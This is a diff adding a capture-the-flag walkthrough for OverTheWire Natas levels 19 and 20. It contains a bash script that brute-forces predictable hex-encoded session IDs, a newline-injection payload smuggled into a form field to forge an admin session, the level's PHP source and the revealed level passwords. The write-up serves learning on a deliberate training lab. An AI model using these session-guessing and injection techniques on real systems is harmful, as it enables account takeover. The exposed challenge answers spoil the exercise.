@@ -1259,8 +1259,236 @@ Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="in
 ```
 # Level 18 -> 19:
 
+abs@MacBookPro OverTheWire % curl "natas19.natas.labs.overthewire.org/index.php?debug=1" -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr                            
+```
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+<p>
+Please login with your admin account to retrieve credentials for natas20.
+</p>
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+```
+
+session IDs are no longer sequential?
+>abs@MacBookPro OverTheWire % curl "natas19.natas.labs.overthewire.org/index.php?debug=1" -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr -F "username=admin" -F "password=password" -i | grep Cookie
+```
+Set-Cookie: PHPSESSID=3631332d61646d696e; path=/; HttpOnly
+```
+Sheeeeet
+
+What is this? Let's run it few more times:
+```
+Set-Cookie: PHPSESSID=3330362d61646d696e; path=/; HttpOnly
+Set-Cookie: PHPSESSID=3430312d61646d696e; path=/; HttpOnly
+```
+Same extesnsion... and also, kind of look like ASCII.
+```
+abs@MacBookPro OverTheWire % echo "3430312d61646d696e" | xxd -r -p
+401-admin%
+abs@MacBookPro OverTheWire % echo "3631332d61646d696e" | xxd -r -p
+613-admin%   
+```
+
+LOL!! Let's do some scripting, based on the prev level:
+```
+#!/bin/bash
+
+IDS=640
+URL="natas19.natas.labs.overthewire.org/index.php/index.php?debug=1"
+LOGIN="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
+PASS=""
+
+for id in $(seq 1 $IDS); do
+
+	OUT=$(curl $URL -u $LOGIN -s -H "Cookie: PHPSESSID=$(echo -n "$id-admin" | xxd -p)")
+	PASS=$(echo $OUT | grep "Password")
+
+	if [ -n "$PASS" ]; then	
+		echo "$OUT"
+		exit
+	fi
+done
+
+echo "Password for natas19: $PASS"
+```
+
+abs@MacBookPro natas % ./brute_force_natas19.sh 
+```
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
+```
+
 
 # Level 19 -> 20:
+abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+```
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD i62ulplu0sknsmud7gkv50it5n<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value=""><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE i62ulplu0sknsmud7gkv50it5n <br>DEBUG: Saving in /var/lib/php/sessions/mysess_i62ulplu0sknsmud7gkv50it5n<br>% 
+```
+
+index-source.html:
+```
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) {
+    //debug("MYOPEN $path $name");
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug("MYCLOSE");
+    return true;
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid");
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug("MYGARBAGE $t");
+    return true;
+}
+
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+```
+
+```
+abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw -F "name=admin" -i
+Set-Cookie: PHPSESSID=v689v281vt6tlod6vmd0qetnug; path=/; HttpOnly
+```
+...
+DEBUG: MYREAD v689v281vt6tlod6vmd0qetnug<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+...
+DEBUG: MYWRITE v689v281vt6tlod6vmd0qetnug name|s:5:"admin";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_v689v281vt6tlod6vmd0qetnug<br>DEBUG: name => admin<br>%
+```
+
+
+abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw  -d $'name=vandelay\nadmin 1' -H "Cookie: PHPSESSID=art"
+```
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD art<br>DEBUG: Reading from /var/lib/php/sessions/mysess_art<br>DEBUG: Read []<br>DEBUG: Name set to vandelay
+admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+...
+DEBUG: MYWRITE art name|s:16:"vandelay
+admin 1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_art<br>DEBUG: name => vandelay
+admin 
+```
+
+abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw  -d $'name=vandelay\nadmin 1' -H "Cookie: PHPSESSID=art"
+```
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD art<br>DEBUG: Reading from /var/lib/php/sessions/mysess_art<br>DEBUG: Read [name vandelay]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to vandelay
+admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
+```
+
 # Level 20 -> 21:
 # Level 21 -> 22:
 # Level 22 -> 23:
